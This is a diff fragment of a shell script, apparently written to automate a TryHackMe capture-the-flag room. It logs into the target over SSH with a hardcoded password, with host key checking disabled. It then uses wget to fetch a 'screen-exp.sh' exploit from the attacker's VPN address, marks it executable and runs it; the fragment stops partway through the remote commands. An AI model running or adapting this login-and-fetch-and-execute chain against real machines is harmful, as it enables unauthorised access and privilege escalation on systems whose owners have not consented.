@@ -11,21 +11,21 @@ missing sshpass
 
 while getopts ":i:u:p:" opt; do
   case $opt in
-    i) ip_address="$OPTARG" ;;
+    i) IP="$OPTARG" ;;
     u) username="$OPTARG" ;;
     p) new_password="$OPTARG" ;;
   esac
 done
 
 
-if [ -z "$ip_address" ] || [ -z "$username" ] || [ -z "$password" ]; then
+if [ -z "$IP" ] || [ -z "$username" ] || [ -z "$new_password" ]; then
   echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password'"
   exit 1
 fi
 
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
-sshpass -p pastisdynamic ssh -o StrictHostKeychecking=no pasta@"$IP" << EOF
+sshpass -p pastaisdynamic ssh -o StrictHostKeychecking=no pasta@"$IP" << EOF
     
     wget http://$vpn/screen-exp.sh && chmod +x screen-exp.sh && ./screen-exp.sh
     sleep 3
